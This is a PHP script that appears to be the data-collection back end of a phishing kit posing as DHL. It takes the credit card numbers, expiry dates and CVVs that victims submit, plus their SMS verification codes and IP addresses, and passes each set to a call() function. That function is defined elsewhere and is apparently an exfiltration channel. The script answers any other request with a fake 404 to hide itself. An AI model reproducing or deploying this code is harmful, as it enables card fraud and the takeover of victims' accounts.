<?php 
session_start();
require '../config.php';



function getIp(){
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    if($_SERVER['REMOTE_ADDR']=="::1"){
        $ip = "1.1.1.1";
    }
    return $ip;
}
$ipp = getIp();


if(isset($_POST['cc'])){
call("/- DHL CC $ipp -/
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
");
return;
}


if(isset($_POST['sms'])){
call("/- DHL SMS $ipp -/
CODE: ".$_POST['sms']."
");
return;
}


header("HTTP/1.0 404 Not Found");

?>